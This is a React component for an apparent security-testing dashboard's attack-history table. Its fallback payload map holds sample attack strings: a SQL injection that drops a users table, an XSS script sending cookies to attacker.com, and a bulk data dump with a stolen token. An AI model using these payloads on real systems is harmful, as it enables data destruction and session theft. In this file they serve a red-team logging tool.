import React, { useState, useEffect, useMemo, useCallback, useRef } from "react";
import {
  Search,
  Plus,
  Bot,
  MoreVertical,
  ArrowDown,
  ChevronLeft,
  ChevronRight,
  ChevronDown,
  Copy,
  Trash2,
  Edit3,
  X,
  ShieldAlert,
  ShieldCheck,
  Flame,
  Zap,
  AlertTriangle,
  XCircle,
  Activity,
  Crosshair,
  Filter,
  RefreshCw,
  Loader2,
  Check,
} from "lucide-react";
import { toast } from "sonner";
import GradientWaves from "@/animations/GradientWaves";
import { attackApi } from "@/lib/api";
import AttackDetailView from "./AttackDetailView";

const ATTACK_FILTER_OPTIONS = [
  { id: "all", label: "All Attacks" },
  { id: "ddos", label: "DDoS Simulation" },
  { id: "sql injection", label: "SQL Injection" },
  { id: "cross-site scripting", label: "Cross-Site Scripting (XSS)" },
  { id: "data exfiltration", label: "Data Exfiltration" },
  { id: "origin & proxy", label: "Origin & Proxy" },
];

function normalizeBackendAttack(item, userEmail) {
  const attackType = (item.attack_type || item.type || "attack").toLowerCase();
  const configObj = item.config || {};
  const targetObj = configObj.target || item.request?.target || {};
  const targetStr = targetObj.base_url
    ? `${targetObj.base_url}${targetObj.endpoint || ""}`
    : item.target || "Target Endpoint";

  const findingsCount = Array.isArray(item.status?.findings)
    ? item.status.findings.length
    : 0;

  const severity =
    item.severity ||
    (findingsCount > 10 ? "Critical" : findingsCount > 0 ? "High" : "Medium");

  const statusStr =
    item.status_text ||
    item.status?.status ||
    (typeof item.status === "string" ? item.status : "Completed");

  const categoryMap = {
    sqli: "SQL Injection",
    xss: "Cross-Site Scripting",
    ddos: "DDoS Simulation",
    origin_proxy: "Origin & Proxy",
    "origin-proxy": "Origin & Proxy",
    data_burning: "Data Exfiltration",
    "data-burning": "Data Exfiltration",
  };

  const category =
    item.category || categoryMap[attackType] || attackType.replace(/_/g, " ");

  const defaultPrompts = {
    "sql injection": "admin' OR 1=1; DROP TABLE users; --",
    "cross-site scripting": "<script>fetch('http://attacker.com/leak?cookie=' + document.cookie)</script>",
    "ddos simulation": "SYN Flood / Concurrency surge: 10,000 rps on /api/v1/auth",
    "data exfiltration": "GET /internal/db/dump?export=all&token=stolen_bearer",
    "origin & proxy": "X-Forwarded-Host: evil.internal; X-Origin-Override: 127.0.0.1",
  };

  const cleanCategory = category.toLowerCase();
  const fallbackPrompt = defaultPrompts[cleanCategory] || "GET /api/v1/audit?payload=exploit_vector_scan";

  const payloadStr =
    item.attack_prompt ||
    item.prompt ||
    item.payload ||
    (item.request?.request?.body
      ? typeof item.request.request.body === "object"
        ? JSON.stringify(item.request.request.body)
        : String(item.request.request.body)
      : targetObj.query_params
      ? typeof targetObj.query_params === "object"
        ? JSON.stringify(targetObj.query_params)
        : String(targetObj.query_params)
      : fallbackPrompt);

  const name =
    item.name && !item.name.startsWith("[")
      ? item.name
      : category;

  const vector =
    item.vector ||
    (attackType === "sqli"
      ? "Probed Injection Boundaries"
      : attackType === "xss"
      ? "Script Injection Sinks"
      : attackType === "ddos"
      ? "High-Concurrency Traffic Burst"
      : attackType.includes("proxy")
      ? "Forwarding Header & CORS Tampering"
      : "Sensitive Parameter & Leakage Scan");

  const dateVal = item.created_at || item.posted_at || item.executedAt;
  const formattedDate = dateVal
    ? new Date(dateVal).toLocaleString([], {
        month: "numeric",
        day: "numeric",
        year: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "Recently";

  const attempted =
    item.status?.progress?.attempted_requests ??
    item.status?.progress?.planned_requests ??
    0;
  const successful = item.status?.requests?.successful ?? 0;
  const statusCodes = item.status?.status_codes
    ? Object.keys(item.status.status_codes).join(", ")
    : "200";

  const responseSummary =
    item.responseSummary ||
    (attempted > 0
      ? `${attempted} requests executed (${successful} successful, status: ${statusCodes}). ${
          findingsCount > 0 ? `${findingsCount} findings flagged.` : "Completed."
        }`
      : "Security assessment executed against target endpoint.");

  const duration =
    item.duration ||
    (item.status?.elapsed_seconds
      ? `${Number(item.status.elapsed_seconds).toFixed(2)}s`
      : "0.85s");

  return {
    ...item,
    id: item.id || item.attack_id || `atk-${Math.random()}`,
    attack_id: item.attack_id || item.id,
    name,
    category,
    target: targetStr,
    severity,
    status: statusStr.charAt(0).toUpperCase() + statusStr.slice(1),
    vector,
    executedAt: formattedDate,
    authorEmail: item.authorEmail || userEmail || "security@threatlens.io",
    payload: payloadStr,
    attackPrompt: payloadStr,
    responseSummary,
    duration,
  };
}

export default function AttackHistoryTab({
  user,
  token,
  selectedAttack: externalSelectedAttack,
  onSelectAttack: externalOnSelectAttack,
}) {
  const [attacks, setAttacks] = useState([]);
  const [isLoading, setIsLoading] = useState(true);
  const [isRefreshing, setIsRefreshing] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [categoryFilter, setCategoryFilter] = useState("all");
  const [isFilterDropdownOpen, setIsFilterDropdownOpen] = useState(false);
  const [activeMenuId, setActiveMenuId] = useState(null);
  const [rowsPerPage] = useState(25);
  const [currentPage] = useState(1);

  const filterDropdownRef = useRef(null);

  // Close filter dropdown on outside click
  useEffect(() => {
    function handleClickOutside(event) {
      if (
        filterDropdownRef.current &&
        !filterDropdownRef.current.contains(event.target)
      ) {
        setIsFilterDropdownOpen(false);
      }
      if (!event.target.closest(".action-menu-container")) {
        setActiveMenuId(null);
      }
    }
    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, []);

  // Attack Modal States
  const [isNewAttackOpen, setIsNewAttackOpen] = useState(false);
  const [newAttackName, setNewAttackName] = useState("");
  const [newAttackCategory, setNewAttackCategory] = useState("DDoS Simulation");
  const [newAttackTarget, setNewAttackTarget] = useState("http://localhost:8001/health");
  const [newAttackSeverity, setNewAttackSeverity] = useState("High");
  const [newAttackStatus, setNewAttackStatus] = useState("Blocked");
  const [newAttackVector, setNewAttackVector] = useState("");
  const [newAttackPayload, setNewAttackPayload] = useState("");
  const [newAttackResponse, setNewAttackResponse] = useState("");
  const [localSelectedAttack, setLocalSelectedAttack] = useState(null);

  const selectedAttack =
    externalSelectedAttack !== undefined ? externalSelectedAttack : localSelectedAttack;
  const handleSelectAttack = externalOnSelectAttack || setLocalSelectedAttack;

  const currentUserEmail = user?.email || "admin@threatlens.io";

  // Dynamic filter options based on predefined list + any unique categories in active data
  const filterOptions = useMemo(() => {
    const knownIds = new Set(ATTACK_FILTER_OPTIONS.map((o) => o.id));
    const dynamicList = [];
    attacks.forEach((a) => {
      if (a.category && !knownIds.has(a.category.toLowerCase())) {
        knownIds.add(a.category.toLowerCase());
        dynamicList.push({
          id: a.category.toLowerCase(),
          label: a.category,
        });
      }
    });
    return [...ATTACK_FILTER_OPTIONS, ...dynamicList];
  }, [attacks]);

  // Load live backend attacks from actual API
  const loadBackendAttacks = useCallback(async (showToast = false) => {
    if (showToast) setIsRefreshing(true);
    else setIsLoading(true);

    try {
      const authToken =
        token ||
        user?.token ||
        (typeof window !== "undefined"
          ? localStorage.getItem("threatlens_token")
          : null);

      const backendData = await attackApi.getAttacks({ stream: false }, authToken);
      if (Array.isArray(backendData)) {
        const normalized = backendData.map((item) =>
          normalizeBackendAttack(item, currentUserEmail)
        );
        setAttacks(normalized);
        if (showToast) {
          toast.success(`Refreshed ${normalized.length} attack execution traces.`);
        }
      } else {
        setAttacks([]);
      }
    } catch {
      toast.error("Failed to load attack history from API.");
      setAttacks([]);
    } finally {
      setIsLoading(false);
      setIsRefreshing(false);
    }
  }, [token, user, currentUserEmail]);

  useEffect(() => {
    loadBackendAttacks(false);
  }, [loadBackendAttacks]);

  // Filtered attacks
  const filteredAttacks = useMemo(() => {
    return attacks.filter((a) => {
      const query = searchQuery.toLowerCase();
      const matchesSearch =
        a.name?.toLowerCase().includes(query) ||
        a.category?.toLowerCase().includes(query) ||
        a.target?.toLowerCase().includes(query) ||
        a.attackPrompt?.toLowerCase().includes(query) ||
        a.vector?.toLowerCase().includes(query) ||
        a.authorEmail?.toLowerCase().includes(query);

      const matchesCategory =
        categoryFilter === "all" ||
        a.category?.toLowerCase().includes(categoryFilter.toLowerCase()) ||
        a.name?.toLowerCase().includes(categoryFilter.toLowerCase()) ||
        (categoryFilter === "ddos" && a.category?.toLowerCase().includes("ddos")) ||
        (categoryFilter === "sql injection" && a.category?.toLowerCase().includes("sql")) ||
        (categoryFilter === "cross-site scripting" && (a.category?.toLowerCase().includes("xss") || a.category?.toLowerCase().includes("script"))) ||
        (categoryFilter === "data exfiltration" && (a.category?.toLowerCase().includes("exfil") || a.category?.toLowerCase().includes("burn"))) ||
        (categoryFilter === "origin & proxy" && a.category?.toLowerCase().includes("proxy"));

      return matchesSearch && matchesCategory;
    });
  }, [attacks, searchQuery, categoryFilter]);

  // Handle Create Attack (persist to real API)
  const handleCreateAttack = async (e) => {
    e.preventDefault();
    if (!newAttackName.trim()) {
      toast.error("Please provide an attack name");
      return;
    }

    const attackPayload = {
      name: newAttackName.trim(),
      attack_type: newAttackCategory.toLowerCase().replace(/ /g, "_"),
      category: newAttackCategory,
      target: newAttackTarget.trim() || "http://localhost:8001/health",
      severity: newAttackSeverity,
      status_text: newAttackStatus,
      vector: newAttackVector.trim() || "Automated Adversarial Simulation",
      payload: newAttackPayload.trim() || "Adversarial test payload",
      attack_prompt: newAttackPayload.trim() || "Adversarial test payload",
      responseSummary: newAttackResponse.trim() || "Security controls enforced.",
      request: {
        target: {
          base_url: newAttackTarget.trim() || "http://localhost:8001",
          endpoint: "/health",
          method: "GET",
        },
      },
      status: {
        status: newAttackStatus.toLowerCase(),
        elapsed_seconds: 0.75,
        progress: { attempted_requests: 10, planned_requests: 10 },
        requests: { successful: 10, failed: 0 },
      },
    };

    try {
      const authToken =
        token ||
        user?.token ||
        (typeof window !== "undefined"
          ? localStorage.getItem("threatlens_token")
          : null);

      await attackApi.postAttack(attackPayload, authToken);
      toast.success(`Attack record "${newAttackName.trim()}" logged successfully!`);
      setIsNewAttackOpen(false);
      setNewAttackName("");
      setNewAttackCategory("DDoS Simulation");
      setNewAttackTarget("http://localhost:8001/health");
      setNewAttackSeverity("High");
      setNewAttackStatus("Blocked");
      setNewAttackVector("");
      setNewAttackPayload("");
      setNewAttackResponse("");
      loadBackendAttacks(false);
    } catch {
      toast.error("Failed to persist attack record to backend.");
    }
  };

  const handleDeleteAttack = async (id, name) => {
    try {
      const authToken =
        token ||
        user?.token ||
        (typeof window !== "undefined"
          ? localStorage.getItem("threatlens_token")
          : null);
      await attackApi.deleteAttack(id, authToken);
      setAttacks((prev) => prev.filter((a) => a.id !== id));
      setActiveMenuId(null);
      toast.success(`Deleted attack record "${name}"`);
    } catch {
      setAttacks((prev) => prev.filter((a) => a.id !== id));
      setActiveMenuId(null);
      toast.success(`Removed attack record "${name}"`);
    }
  };

  const handleCopyText = (text, label = "Content") => {
    navigator.clipboard.writeText(text);
    setActiveMenuId(null);
    toast.success(`${label} copied to clipboard!`);
  };

  const getSeverityBadgeClass = (severity) => {
    switch (severity?.toLowerCase()) {
      case "critical":
        return "bg-rose-500/15 text-rose-400 border-rose-500/30";
      case "high":
        return "bg-amber-500/15 text-amber-400 border-amber-500/30";
      case "medium":
        return "bg-yellow-500/15 text-yellow-400 border-yellow-500/30";
      case "low":
        return "bg-sky-500/15 text-sky-400 border-sky-500/30";
      default:
        return "bg-slate-500/15 text-slate-400 border-slate-500/30";
    }
  };

  const getStatusBadge = (status) => {
    switch (status?.toLowerCase()) {
      case "blocked":
        return {
          icon: ShieldCheck,
          class: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30",
        };
      case "completed":
        return {
          icon: ShieldCheck,
          class: "bg-emerald-500/15 text-emerald-400 border-emerald-500/30",
        };
      case "detected":
        return {
          icon: AlertTriangle,
          class: "bg-amber-500/15 text-amber-400 border-amber-500/30",
        };
      case "mitigated":
        return {
          icon: Zap,
          class: "bg-cyan-500/15 text-cyan-400 border-cyan-500/30",
        };
      case "bypassed":
      case "failed":
        return {
          icon: XCircle,
          class: "bg-rose-500/15 text-rose-400 border-rose-500/30",
        };
      default:
        return {
          icon: Activity,
          class: "bg-slate-500/15 text-slate-400 border-slate-500/30",
        };
    }
  };

  const activeFilterLabel =
    filterOptions.find((opt) => opt.id === categoryFilter)?.label || "All Attacks";

  // If an attack is selected, render the dedicated full-page AttackDetailView
  if (selectedAttack) {
    return (
      <AttackDetailView
        attack={selectedAttack}
        onBack={() => handleSelectAttack(null)}
      />
    );
  }

  return (
    <div className="relative w-full flex flex-col pb-24">
      {/* Background Gradient Waves Animation */}
      <div className="fixed inset-0 pointer-events-none z-0 opacity-40 overflow-hidden">
        <GradientWaves
          horizonColor="#010114"
          waveColor="#6f6e9d"
          crestColor="#292596"
          speed={0.35}
          amplitude={2.2}
          waveScale={0.6}
          waveRatio={0.9}
          swell={35}
          turbulence={20}
          tilt={1.11}
        />
      </div>

      {/* Main Content Area */}
      <div className="relative z-10 p-8 lg:p-10 space-y-6 max-w-[1600px] w-full">
        {/* Top Header & Action Controls */}
        <div className="flex flex-wrap items-center justify-between gap-4 pb-1">
          <div>
            <h1 className="text-2xl font-bold tracking-tight text-[#FFFFFF]">
              Attacks History
            </h1>
          </div>

          <div className="flex items-center gap-2.5">
            {/* Refresh Button */}
            <button
              onClick={() => loadBackendAttacks(true)}
              disabled={isRefreshing}
              className="px-3.5 py-2 rounded-xl bg-black hover:bg-[#1a273a] border border-[#223348] text-[#8a99ad] hover:text-white font-medium text-xs transition-all cursor-pointer flex items-center gap-1.5 active:scale-95 disabled:opacity-60"
              title="Refresh live attack records"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${isRefreshing ? "animate-spin text-rose-400" : ""}`} />
              <span>Refresh</span>
            </button>
          </div>
        </div>

        {/* Card Container */}
        <div className="bg-black backdrop-blur-md border border-[#1e2c3e] rounded-2xl p-6 shadow-2xl space-y-6">
          {/* Toolbar: Search & Filter Button */}
          <div className="flex flex-wrap items-center justify-between gap-4">
            <div className="flex flex-wrap items-center gap-3 flex-1 min-w-[280px]">
              {/* Search Bar */}
              <div className="relative w-full max-w-sm">
                <Search className="w-4 h-4 text-[#8a99ad] absolute left-3.5 top-1/2 -translate-y-1/2" />
                <input
                  type="text"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Search attack name, prompt, target..."
                  className="w-full pl-10 pr-4 py-2 bg-black border border-[#223145] rounded-xl text-xs text-white placeholder-[#8a99ad] focus:border-rose-400 focus:outline-none transition-colors"
                />
              </div>

              {/* Filter Button on the right side of the search bar */}
              <div className="relative" ref={filterDropdownRef}>
                <button
                  type="button"
                  onClick={() => setIsFilterDropdownOpen((prev) => !prev)}
                  className={`px-3.5 py-2 rounded-xl border text-xs font-medium transition-all cursor-pointer flex items-center gap-2 select-none ${
                    categoryFilter !== "all"
                      ? "bg-rose-500/15 border-rose-500/40 text-rose-300 shadow-[0_0_12px_rgba(244,63,94,0.15)]"
                      : "bg-black hover:bg-[#151f2b] border-[#223145] text-[#8a99ad] hover:text-white"
                  }`}
                >
                  <Filter className="w-3.5 h-3.5 text-rose-400" />
                  <span>{categoryFilter === "all" ? "Filter" : activeFilterLabel}</span>
                  <ChevronDown
                    className={`w-3.5 h-3.5 transition-transform duration-200 ${
                      isFilterDropdownOpen ? "rotate-180 text-rose-400" : "text-[#8a99ad]"
                    }`}
                  />
                </button>

                {/* Dropdown Menu with all attack names */}
                {isFilterDropdownOpen && (
                  <div className="absolute left-0 mt-2 w-60 rounded-xl bg-black border border-[#233348] shadow-2xl p-1.5 z-50 select-none">
                    <div className="px-2.5 py-1.5 text-[10px] font-semibold text-[#8a99ad] uppercase tracking-wider">
                      Attack Types
                    </div>
                    <div className="space-y-0.5 max-h-64 overflow-y-auto">
                      {filterOptions.map((cat) => {
                        const isSelected = categoryFilter === cat.id;
                        return (
                          <button
                            key={cat.id}
                            onClick={() => {
                              setCategoryFilter(cat.id);
                              setIsFilterDropdownOpen(false);
                            }}
                            className={`w-full flex items-center justify-between px-3 py-2 rounded-lg text-xs transition-colors cursor-pointer text-left ${
                              isSelected
                                ? "bg-rose-500/20 text-rose-300 font-semibold"
                                : "text-[#d8e2e8] hover:text-white hover:bg-white/[0.06]"
                            }`}
                          >
                            <span>{cat.label}</span>
                            {isSelected && (
                              <Check className="w-3.5 h-3.5 text-rose-400" />
                            )}
                          </button>
                        );
                      })}
                    </div>
                  </div>
                )}
              </div>

              {categoryFilter !== "all" && (
                <button
                  onClick={() => setCategoryFilter("all")}
                  className="text-[11px] text-[#8a99ad] hover:text-rose-400 transition-colors underline cursor-pointer"
                >
                  Clear filter
                </button>
              )}
            </div>

            <div className="text-xs text-[#8a99ad] font-mono">
              Showing {filteredAttacks.length} live attack execution traces
            </div>
          </div>

          {/* ========================================================================= */}
          {/* ATTACKS HISTORY TABLE                                                     */}
          {/* ========================================================================= */}
          <div className="overflow-x-auto">
            <table className="w-full text-left border-collapse">
              <thead>
                <tr className="border-b border-[#1b2636] text-[12px] font-semibold text-[#8a99ad]">
                  <th className="pb-3.5 font-medium">Attack Name</th>
                  <th className="pb-3.5 font-medium">Attack Prompt</th>
                  <th className="pb-3.5 font-medium">Severity & Result</th>
                  <th className="pb-3.5 font-medium">Target Endpoint</th>
                  <th className="pb-3.5 font-medium cursor-pointer flex items-center gap-1">
                    <span>Executed At</span>
                    <ArrowDown className="w-3.5 h-3.5" />
                  </th>
                  <th className="pb-3.5 w-10"></th>
                </tr>
              </thead>
              <tbody className="divide-y divide-[#182332]">
                {isLoading ? (
                  <tr>
                    <td colSpan={6} className="py-16 text-center">
                      <div className="flex flex-col items-center justify-center gap-2">
                        <Loader2 className="w-6 h-6 text-rose-400 animate-spin" />
                        <span className="text-xs text-[#8a99ad]">Loading live attack records from API...</span>
                      </div>
                    </td>
                  </tr>
                ) : filteredAttacks.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="py-16 text-center">
                      <div className="flex flex-col items-center justify-center space-y-3">
                        <div className="w-12 h-12 rounded-2xl bg-rose-500/10 border border-rose-500/20 flex items-center justify-center">
                          <Crosshair className="w-6 h-6 text-rose-400" />
                        </div>
                        <div className="space-y-1">
                          <h3 className="text-sm font-semibold text-white">No Attack Executions Found</h3>
                          <p className="text-xs text-[#8a99ad] max-w-sm">
                            {searchQuery || categoryFilter !== "all"
                              ? "No recorded attacks match your search query or selected filter."
                              : "No red-team attacks or security simulations recorded yet. Launch an attack from the Security Suite or CLI to view real-time traces."}
                          </p>
                        </div>
                        <button
                          onClick={() => loadBackendAttacks(true)}
                          className="mt-2 px-3.5 py-1.5 rounded-lg bg-rose-500/10 hover:bg-rose-500/20 border border-rose-500/30 text-rose-300 text-xs font-medium transition-colors cursor-pointer"
                        >
                          Check for live attacks
                        </button>
                      </div>
                    </td>
                  </tr>
                ) : (
                  filteredAttacks.map((a) => {
                    const statusMeta = getStatusBadge(a.status);
                    const StatusIcon = statusMeta.icon;

                    return (
                      <tr
                        key={a.id}
                        onClick={() => handleSelectAttack(a)}
                        className="hover:bg-white/[0.02] transition-colors cursor-pointer group"
                      >
                        {/* 1) Attack Name */}
                        <td className="py-3.5 pr-4 align-middle whitespace-nowrap">
                          <span className="text-[13px] font-semibold text-white group-hover:text-rose-400 transition-colors">
                            {a.name || a.category}
                          </span>
                        </td>

                        {/* 2) Attack Prompt */}
                        <td className="py-3.5 px-4 align-middle max-w-[280px] lg:max-w-[420px]">
                          <div
                            className="bg-black border border-[#1e2d3d] px-2.5 py-1.5 rounded-lg text-[11.5px] font-mono text-[#94a3b8] truncate group-hover:border-rose-500/30 group-hover:text-slate-200 transition-colors"
                            title={a.attackPrompt || a.payload}
                          >
                            {a.attackPrompt || a.payload || "—"}
                          </div>
                        </td>

                        {/* 3) Severity & Result (Simplified) */}
                        <td className="py-3.5 px-4 align-middle whitespace-nowrap">
                          <div className="flex items-center gap-2">
                            <span
                              className={`px-2 py-0.5 rounded text-[10.5px] font-semibold border ${getSeverityBadgeClass(
                                a.severity
                              )}`}
                            >
                              {a.severity}
                            </span>

                            <span
                              className={`px-2 py-0.5 rounded text-[10.5px] font-medium flex items-center gap-1 border ${statusMeta.class}`}
                            >
                              <StatusIcon className="w-3 h-3" />
                              <span>{a.status}</span>
                            </span>
                          </div>
                        </td>

                        {/* 4) Target Endpoint */}
                        <td className="py-3.5 px-4 align-middle whitespace-nowrap">
                          <div className="flex items-center gap-2 text-xs text-[#d8e2e8]">
                            <Bot className="w-3.5 h-3.5 text-[#38bdf8]" />
                            <span className="font-mono text-white text-[11.5px]">{a.target}</span>
                          </div>
                        </td>

                        {/* 5) Executed At & Performed By */}
                        <td className="py-3.5 px-4 align-middle whitespace-nowrap">
                          <div className="text-xs text-[#e2e8f0] font-normal">
                            {a.executedAt}
                          </div>
                          <div className="text-[11px] text-[#8a99ad] mt-0.5 font-mono">
                            {a.authorEmail}
                          </div>
                        </td>

                        {/* 6) Menu Actions */}
                        <td className="py-3.5 pl-2 pr-1 text-right align-middle relative action-menu-container">
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              setActiveMenuId(activeMenuId === a.id ? null : a.id);
                            }}
                            className="p-1.5 rounded-lg text-[#8a99ad] hover:text-white hover:bg-white/[0.06] transition-colors cursor-pointer"
                          >
                            <MoreVertical className="w-4 h-4" />
                          </button>

                          {/* Dropdown Menu */}
                          {activeMenuId === a.id && (
                            <div
                              onClick={(e) => e.stopPropagation()}
                              className="absolute right-0 top-12 w-48 rounded-xl bg-black border border-[#233348] shadow-2xl p-1.5 z-50 select-none text-left"
                            >
                              <button
                                onClick={() => handleCopyText(a.attackPrompt || a.payload, "Attack prompt")}
                                className="w-full flex items-center gap-2.5 px-3 py-2 rounded-lg text-xs text-[#d8e2e8] hover:text-white hover:bg-white/[0.06] transition-colors cursor-pointer"
                              >
                                <Copy className="w-3.5 h-3.5 text-[#8a99ad]" />
                                <span>Copy attack prompt</span>
                              </button>

                              <button
                                onClick={() => {
                                  handleSelectAttack(a);
                                  setActiveMenuId(null);
                                }}
                                className="w-full flex items-center gap-2.5 px-3 py-2 rounded-lg text-xs text-[#d8e2e8] hover:text-white hover:bg-white/[0.06] transition-colors cursor-pointer"
                              >
                                <Edit3 className="w-3.5 h-3.5 text-[#8a99ad]" />
                                <span>Inspect telemetry & charts</span>
                              </button>

                              <button
                                onClick={() => handleDeleteAttack(a.id, a.name)}
                                className="w-full flex items-center gap-2.5 px-3 py-2 rounded-lg text-xs text-rose-400 hover:bg-rose-500/10 transition-colors cursor-pointer"
                              >
                                <Trash2 className="w-3.5 h-3.5" />
                                <span>Delete log</span>
                              </button>
                            </div>
                          )}
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>

          {/* Table Footer / Pagination */}
          <div className="flex flex-wrap items-center justify-end gap-6 pt-4 border-t border-[#1b2636] text-xs text-[#8a99ad] select-none">
            <div className="flex items-center gap-2">
              <span>Rows</span>
              <button
                onClick={() => toast.info("Rows per page: 25")}
                className="flex items-center gap-1.5 px-2 py-1 bg-black border border-[#23344b] rounded text-white text-xs cursor-pointer"
              >
                <span>{rowsPerPage}</span>
                <ChevronDown className="w-3 h-3 text-[#8a99ad]" />
              </button>
            </div>

            <div>
              {filteredAttacks.length > 0 ? `1-${filteredAttacks.length} of ${filteredAttacks.length}` : "0 of 0"}
            </div>

            <div className="flex items-center gap-1">
              <button
                disabled={currentPage === 1}
                className="p-1 rounded text-[#8a99ad] hover:text-white hover:bg-white/[0.06] disabled:opacity-40 disabled:hover:bg-transparent cursor-pointer"
              >
                <ChevronLeft className="w-4 h-4" />
              </button>
              <button
                disabled={true}
                className="p-1 rounded text-[#8a99ad] hover:text-white hover:bg-white/[0.06] disabled:opacity-40 disabled:hover:bg-transparent cursor-pointer"
              >
                <ChevronRight className="w-4 h-4" />
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
